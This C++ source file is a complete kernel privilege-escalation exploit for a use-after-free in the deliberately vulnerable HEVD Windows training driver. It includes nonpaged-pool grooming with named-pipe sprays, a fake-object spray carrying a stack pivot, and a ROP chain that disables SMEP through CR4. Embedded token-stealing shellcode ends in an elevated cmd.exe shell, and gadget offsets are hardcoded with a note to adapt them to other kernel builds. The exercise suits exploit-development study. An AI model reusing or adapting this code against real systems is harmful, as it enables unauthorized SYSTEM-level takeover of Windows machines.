#include "Common.h"
#include "Exploits.h"
#include <vector>

/*
   HEVD UAF / Medium Integrity

   Author: @xct_de
   Target: 10.0.19044

   Allocate UaF object, Free object, Allocate Fake object (will be interpreted as UaF Object & we get control over a pointer), Use UaF Object.
   We have to "hope" that the Fake object gets into the same spot as the UaF object was before being freed.

   Debug: 
   ba e1 HEVD!IrpDeviceIoCtlHandler+60
   ba e1 HEVD!AllocateUaFObjectNonPagedPool
   ba e1 HEVD!FreeUaFObjectNonPagedPool
   ba e1 HEVD!UseUaFObjectNonPagedPool

   NTSTATUS Description: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-erref/596a1078-e883-4972-9bbc-49e60bebca55
*/

namespace HevdUAFMINS {
    DWORD ALLOCATE_UAF_IOCTL = 0x222013;
    DWORD FREE_UAF_IOCTL = 0x22201B;
    DWORD FAKE_OBJECT_IOCTL = 0x22201F;
    DWORD USE_UAF_IOCTL = 0x222017;

	// static gadgets, replace for other kernel version
	DWORD STACK_PIVOT = 0x5988ce; //0x1405988ce: mov esp, 0x83000000 ; ret ;
	QWORD STACK_PIVOT_ADDR = 0x83000000;
	DWORD MOV_CR4_RCX = 0x514999;
	DWORD POP_RCX = 0x99710c;

	BYTE sc[256] = {
		0x48, 0x31, 0xc0, 0x65, 0x48, 0x8b, 0x80, 0x88, 0x01, 0x00,
		0x00, 0x48, 0x8b, 0x80, 0xb8, 0x00, 0x00, 0x00, 0x49, 0x89,
		0xc1, 0x48, 0x8b, 0x80, 0x48, 0x04, 0x00, 0x00, 0x48, 0x8b,
		0x00, 0x48, 0x8b, 0x50, 0xf8, 0x49, 0x89, 0xc0, 0x48, 0x8b,
		0x00, 0x48, 0x83, 0xfa, 0x04, 0x75, 0xf0, 0x49, 0x8b, 0x50,
		0x70, 0x48, 0x83, 0xe2, 0xf8, 0x49, 0x8b, 0x89, 0xb8, 0x04,
		0x00, 0x00, 0x48, 0x83, 0xe1, 0x07, 0x48, 0x01, 0xca, 0x49,
		0x89, 0x91, 0xb8, 0x04, 0x00, 0x00, 0x65, 0x48, 0x8b, 0x04,
		0x25, 0x88, 0x01, 0x00, 0x00, 0x66, 0x8b, 0x88, 0xe4, 0x01,
		0x00, 0x00, 0x66, 0xff, 0xc1, 0x66, 0x89, 0x88, 0xe4, 0x01,
		0x00, 0x00, 0x48, 0x8b, 0x90, 0x90, 0x00, 0x00, 0x00, 0x48,
		0x8b, 0x8a, 0x68, 0x01, 0x00, 0x00, 0x4c, 0x8b, 0x9a, 0x78,
		0x01, 0x00, 0x00, 0x48, 0x8b, 0xa2, 0x80, 0x01, 0x00, 0x00,
		0x48, 0x8b, 0xaa, 0x58, 0x01, 0x00, 0x00, 0x31, 0xc0, 0x0f,
		0x01, 0xf8, 0x48, 0x0f, 0x07, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff
	};

	void CreateUAFObject(HANDLE hDriver) {
		DWORD retBytes = 0;
		DeviceIoControl(hDriver, ALLOCATE_UAF_IOCTL, NULL, NULL, NULL, 0, &retBytes, NULL);
	}

	void FreeUAFObject(HANDLE hDriver) {
		DWORD retBytes = 0;
		DeviceIoControl(hDriver, FREE_UAF_IOCTL, NULL, NULL, NULL, 0, &retBytes, NULL);
	}

	void CreateFakeObject(HANDLE hDriver) {
		// leak ntBase (medium integrity)
		QWORD ntBase = getBaseAddr(L"ntoskrnl.exe");

		// prepare sc
		LPVOID sc_ptr = VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		RtlCopyMemory(sc_ptr, sc, sizeof(sc));

		// prepare stack
		DWORD stack_addr = STACK_PIVOT_ADDR - 0x1000;
		printf("[*] Allocating fake stack @ %llx\n", stack_addr);
		LPVOID stack_ptr = VirtualAlloc((LPVOID)stack_addr, 0x14000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		printf("[>] Fake Stack: %llx\n", stack_ptr);

		// push & read some values in the fake stack region to make sure its paged
		printf("[>] Page in stack..\n");
		int step = 0x800;
		for (int i = 0; i <= 0x15000 / step; i++) {
			*(QWORD*)((QWORD)stack_ptr + i * step) = 0xdeadc0de;
			printf("%llx:%llx ", (QWORD)stack_ptr + i * step, *(QWORD*)((QWORD)stack_ptr + i * step));
			*(QWORD*)((QWORD)stack_ptr + i * step) = 0x0;
		}		
		printf("\n");

		// prepare rop to disable smep & jump to sc_ptr by writing to fake stack region
		QWORD rop = STACK_PIVOT_ADDR;
		*(QWORD*)(rop) = ntBase + POP_RCX;
		*(QWORD*)(rop + 8) = 0x50ef8; // rcx value with 20th bit zeroed out
		*(QWORD*)(rop + 16) = ntBase + MOV_CR4_RCX;
		*(QWORD*)(rop + 24) = (ULONGLONG)sc_ptr;

		BYTE uBuffer[0x60] = { 0 };
		*(QWORD*)(uBuffer) = (QWORD)(ntBase + STACK_PIVOT);
		printf("[>] ScPtr: 0x%llx\n", sc_ptr);

		printf("[>] Spraying fake objects to fill some holes\n");
		DWORD retBytes = 0;
		for (int i = 0; i < 30000; i++) {
			DeviceIoControl(hDriver, FAKE_OBJECT_IOCTL, uBuffer, sizeof(uBuffer), NULL, 0, &retBytes, NULL);
		}
	}

	void UseUAFObject(HANDLE hDriver) {
		DWORD retBytes = 0;
		DeviceIoControl(hDriver, USE_UAF_IOCTL, NULL, NULL, NULL, 0, &retBytes, NULL);
	}

	typedef struct PipeHandles {
		HANDLE read;
		HANDLE write;
	} PipeHandles;

	PipeHandles CreatePipeObject() {
		DWORD ALLOC_SIZE = 0x70;
		BYTE uBuffer[0x28]; // ALLOC_SIZE - 0x48, 0x48 is the header size
		BOOL res = FALSE;
		HANDLE readPipe = NULL;
		HANDLE writePipe = NULL;
		DWORD resultLength;

		// Write the data in user space buffer
		RtlFillMemory(uBuffer, 0x28, 0x41);

		// Creating the pipe to kernel space
		// size and contents of the allocated pool chunk will depend on the uBuffer variable
		// size confirmed by poolMonitor, whats in the nonpaged pool are the Data_ENTRY records it uses internally
		// https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/-poolfind !poolfind NpFr 0
		res = CreatePipe(&readPipe,	&writePipe,	NULL, sizeof(uBuffer));
		if (res == FALSE)
		{
			printf("[!] Failed creating Pipe\r\n");
			exit(-1);
		}

		// Write data into the kernel space buffer from user space buffer
		// The following API call will trigger allocation in non-paged pool
		res = FALSE;
		res = WriteFile(writePipe, uBuffer,	sizeof(uBuffer), &resultLength,	NULL);
		if (res == FALSE)
		{
			printf("[!] Failed writing to Pipe\r\n");
			exit(-1);
		}		
		return PipeHandles{ readPipe, writePipe };	
	}

	void Exploit(int argc, char** argv) {
		HANDLE hDriver = CreateFile(L"\\\\.\\HacksysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
		if (hDriver == INVALID_HANDLE_VALUE)
		{
			printf("[!] Error while creating a handle to the driver: %d\n", GetLastError());
			exit(1);
		}

		// Pool Defragmentation Spray
		// check via !poolused 2 NpFr
		printf("[>] Spraying pool defragmentation..\n");
		std::vector<PipeHandles> defragPipeHandles;
		for (int i = 0; i < 20000; i++) {
			PipeHandles pipeHandle = CreatePipeObject();
			defragPipeHandles.push_back(pipeHandle);
		}

		// Groom Pool
		// check via !poolused 2 NpFr
		printf("[>] Spraying sequential allocation..\n");
		std::vector<PipeHandles> seqPipeHandles;
		for (int i = 0; i < 60000; i++) {
			PipeHandles pipeHandle = CreatePipeObject();
			seqPipeHandles.push_back(pipeHandle);
		}

		// Punch holes (Closing the handles frees the allocations)
		// check via  !poolused 2 NpFr
		printf("[>] Punching holes...\n");
		for (int i = 0; i < seqPipeHandles.size(); i++) {
			if (i % 2 == 0) {
				PipeHandles handles = seqPipeHandles[i];
				CloseHandle(handles.read);
				CloseHandle(handles.write);
			}
		}

		printf("[>] Look at my handles: 0x%llx, 0x%llx\n", seqPipeHandles[29997].read, seqPipeHandles[29997].write);

		/*
		1: kd> !handle 4e764
			PROCESS ffffe30e412912c0
				SessionId: 1  Cid: 0cd4    Peb: bf33e55000  ParentCid: 1e08
				DirBase: 887ec000  ObjectTable: ffffbc0c971194c0  HandleCount: 50036.
				Image: Exploit.exe

			Handle table at ffffbc0c971194c0 with 50036 entries in use

			4e764: Object: ffffe30e45c15d80  GrantedAccess: 00120196 (Protected) (Audit) Entry: ffffbc0c9d8ebd90
			Object: ffffe30e45c15d80  Type: (ffffe30e3d2f3da0) File
				ObjectHeader: ffffe30e45c15d50 (new version)
					HandleCount: 1  PointerCount: 32768

		   kd> !pool ffffe30e45c15d80
		*/

		//getchar();
		//DebugBreak();


		// Put the UAF object into a hole
		printf("[>] Allocating UAF Object\n");
		CreateUAFObject(hDriver);

		// Free it again
		printf("[>] Freeing UAF Object\n");
		FreeUAFObject(hDriver);

		// Spray fake objects holes, hopefully hitting the one we need
		printf("[>] Preparing payload..\n");
		CreateFakeObject(hDriver);

		// call freed pointer (hopefuly its replaced with our fake object now)
		printf("[!] Press enter to continue\n");
		getchar();
		printf("[*] Triggering UAF FuncPtr\n");
		UseUAFObject(hDriver);

		system("cmd.exe");
	}
}

int HevdUAFMI(int argc, char** argv) {
	printf("~-------------------~\n");
	printf("  Running HevdUAFMI  \n");
	printf("~-------------------~\n");

	HevdUAFMINS::Exploit(argc, argv);
	return 0;
}